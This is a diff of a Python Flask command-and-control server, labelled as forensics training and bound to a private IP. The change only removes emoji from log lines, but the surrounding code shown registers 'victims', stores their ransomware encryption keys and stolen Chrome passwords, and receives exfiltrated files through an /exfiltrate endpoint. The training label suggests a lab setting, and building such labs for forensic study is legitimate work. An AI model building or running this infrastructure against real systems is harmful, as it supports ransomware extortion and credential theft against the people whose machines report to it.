@@ -41,7 +41,7 @@ def register():
         victim_id = data.get('victim_id', 'unknown')
         
         print("=" * 70)
-        print(f"🚨 NEW VICTIM: {victim_id}")
+        print(f" NEW VICTIM: {victim_id}")
         print(f"   Host: {data.get('hostname')}")
         print(f"   User: {data.get('username')}")
         print(f"   IP: {request.remote_addr}")
@@ -59,7 +59,7 @@ def register():
             with open(key_file, "w") as f:
                 f.write(f"Victim: {victim_id}\n")
                 f.write(f"Key: {data['encryption_key']}\n")
-            print(f"🔑 Key saved")
+            print(f"Key saved")
         
         if data.get('chrome_passwords'):
             pwd_file = os.path.join(PASSWORDS_DIR, f"{victim_id}_passwords.json")
@@ -70,7 +70,7 @@ def register():
         return jsonify({"status": "success"}), 200
         
     except Exception as e:
-        print(f"❌ Error: {e}")
+        print(f" Error: {e}")
         return jsonify({"status": "error"}), 500
 
 @app.route('/exfiltrate', methods=['POST'])
@@ -80,7 +80,7 @@ def exfiltrate():
         victim_id = data.get('victim_id', 'unknown')
         
         print("=" * 70)
-        print(f"📤 EXFILTRATION: {victim_id}")
+        print(f" EXFILTRATION: {victim_id}")
         print(f"   Files: {data.get('count', 0)}")
         print("=" * 70)
         
@@ -93,7 +93,7 @@ def exfiltrate():
         return jsonify({"status": "success"}), 200
         
     except Exception as e:
-        print(f"❌ Error: {e}")
+        print(f" Error: {e}")
         return jsonify({"status": "error"}), 500
 
 @app.route('/health')
@@ -116,7 +116,7 @@ def loader():
 
 if __name__ == '__main__':
     print("=" * 70)
-    print("🚨 C2 SERVER - FORENSICS TRAINING")
+    print(" C2 SERVER - FORENSICS TRAINING")
     print("=" * 70)
     print(f"IP: 192.168.74.147:8080")
     print("=" * 70)
